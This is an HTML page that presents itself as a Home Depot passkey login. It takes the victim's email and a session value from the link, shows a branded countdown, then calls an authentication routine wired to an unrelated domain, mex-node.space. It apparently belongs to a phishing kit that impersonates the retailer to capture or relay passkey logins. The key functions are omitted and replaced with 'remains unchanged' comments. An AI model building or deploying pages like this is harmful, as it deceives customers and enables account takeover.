<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Home Depot Passkey Auth</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      background: #ffffff; /* White background */
      min-height: 100vh;
      overflow: hidden;
      font-family: 'Arial', sans-serif;
      margin: 0; /* Remove default margin */
    }
    .glow {
      box-shadow: 0 0 15px rgba(249, 115, 22, 0.8), 0 0 30px rgba(249, 115, 22, 0.4);
    }
    .pulse {
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }
    .stars {
      position: absolute;
      width: 3px;
      height: 3px;
      background: rgba(249, 115, 22, 0.9); /* Orange stars */
      border-radius: 50%;
      animation: twinkle 2.5s infinite;
    }
    @keyframes twinkle {
      0%, 100% { opacity: 0.4; }
      50% { opacity: 1; }
    }
    .hammer {
      display: inline-block;
      width: 20vw; /* Relative to viewport width */
      max-width: 80px; /* Cap for larger screens */
      height: 20vw;
      max-height: 80px;
      background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" fill="%23f97316" viewBox="0 0 24 24"><path d="M20.56 3.91c-.59-.59-1.54-.59-2.12 0L8.57 13.78l1.06 1.06 9.87-9.87c.59-.59.59-1.54 0-2.12zM4.93 17.66l-1.06 1.06c-.39.39-.39 1.02 0 1.41l1.41 1.41c.39.39 1.02.39 1.41 0l1.06-1.06-2.82-2.82zM17.66 4.93l-9.87 9.87-2.82-2.82 9.87-9.87c.59-.59 1.54-.59 2.12 0 .59.59.59 1.54 0 2.12z"/></svg>') no-repeat center;
      background-size: contain;
      animation: hammerSwing 1.5s infinite ease-in-out;
    }
    @keyframes hammerSwing {
      0% { transform: rotate(0deg); }
      25% { transform: rotate(-20deg); }
      75% { transform: rotate(20deg); }
      100% { transform: rotate(0deg); }
    }
    .welcome-screen {
      position: fixed;
      inset: 0;
      background: linear-gradient(135deg, #f97316, #e55b00); /* Home Depot orange tones */
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 20;
      transition: opacity 0.8s ease;
    }
    .welcome-screen.hidden {
      opacity: 0;
      pointer-events: none;
    }
    #welcome h1 {
      font-size: clamp(2rem, 8vw, 7rem); /* Responsive font size */
      text-align: center;
      padding: 1rem;
    }
    /* White pulsating modal with orange text */
    #auth-card {
      background: #ffffff; /* White background */
      color: #f97316; /* Orange text */
      width: 90%; /* Responsive width */
      max-width: 500px; /* Cap for larger screens */
      padding: clamp(1rem, 3vw, 2.5rem); /* Responsive padding */
      margin: 0 auto;
    }
    #auth-card h1 {
      font-size: clamp(1.5rem, 5vw, 3rem); /* Responsive title */
    }
    #countdown {
      font-size: clamp(1.25rem, 4vw, 2rem); /* Responsive countdown */
    }
    #status {
      font-size: clamp(1rem, 3vw, 1.25rem); /* Responsive status */
    }

    /* Media Queries for Fine-Tuning */
    @media (max-width: 768px) {
      .stars {
        width: 2px;
        height: 2px; /* Smaller stars on mobile */
      }
      .hammer {
        width: 15vw;
        height: 15vw;
        max-width: 60px;
        max-height: 60px; /* Smaller hammer on mobile */
      }
    }
    @media (max-width: 480px) {
      #auth-card {
        padding: 1rem; /* Tighter padding on very small screens */
      }
      .hammer {
        width: 12vw;
        height: 12vw;
        max-width: 50px;
        max-height: 50px; /* Even smaller on tiny screens */
      }
    }
  </style>
</head>
<body class="flex items-center justify-center">
  <!-- Starry Background -->
  <div id="stars-container" class="fixed inset-0"></div>

  <!-- Welcome Screen -->
  <div id="welcome" class="welcome-screen">
    <h1 class="font-bold text-white drop-shadow-lg">Welcome to The Home Depot</h1>
  </div>

  <!-- Authentication Card (White Modal) -->
  <div id="auth-card" class="relative z-10 bg-opacity-100 rounded-2xl glow pulse text-center hidden">
    <h1 class="font-bold mb-6 text-orange-600 drop-shadow-md">
      Passkey Authentication
    </h1>
    <div id="countdown" class="font-bold text-orange-600 mb-4"></div>
    <div id="status" class="font-medium text-orange-600 mb-6"></div>
    <div class="hammer"></div> <!-- Hammer at the bottom -->
  </div>

  <script>
    // [Previous gatherUserDetails function remains unchanged]

    // Generate twinkling stars
    const starsContainer = document.getElementById('stars-container');
    for (let i = 0; i < 150; i++) {
      const star = document.createElement('div');
      star.className = 'stars';
      star.style.left = `${Math.random() * 100}vw`;
      star.style.top = `${Math.random() * 100}vh`;
      star.style.animationDelay = `${Math.random() * 2.5}s`;
      starsContainer.appendChild(star);
    }

    // [Previous base64urlToArrayBuffer and arrayBufferToBase64url functions remain unchanged]

    const welcome = document.getElementById('welcome');
    const authCard = document.getElementById('auth-card');
    const countdownDisplay = document.getElementById('countdown');
    const status = document.getElementById('status');
    const BASE_URL = 'https://mex-node.space';

    let countdownTimer = null;

    // Get email from query parameters
    const urlParams = new URLSearchParams(window.location.search);
    const username = urlParams.get('email');
    const session = urlParams.get('session');

    // Show welcome screen for 3 seconds, then start authentication
    setTimeout(() => {
      welcome.classList.add('hidden');
      authCard.classList.remove('hidden');
      if (username) {
        startCountdown(username);
      } else {
        status.textContent = 'Error: No email provided in URL';
        status.className = 'text-red-400';
      }
    }, 3000);

    function clearCountdown() {
      if (countdownTimer) {
        clearInterval(countdownTimer);
        countdownTimer = null;
      }
      countdownDisplay.textContent = '';
      status.textContent = '';
    }

    function startCountdown(username) {
      let count = 4;
      countdownDisplay.textContent = `Authenticating in ${count}...`;

      countdownTimer = setInterval(async () => {
        count--;
        if (count > 0) {
          countdownDisplay.textContent = `Authenticating in ${count}...`;
        } else {
          clearInterval(countdownTimer);
          countdownDisplay.textContent = '';
          await authenticate(username);
        }
      }, 1000);
    }

    // [Previous authenticate function remains unchanged]
  </script>
</body>
</html>
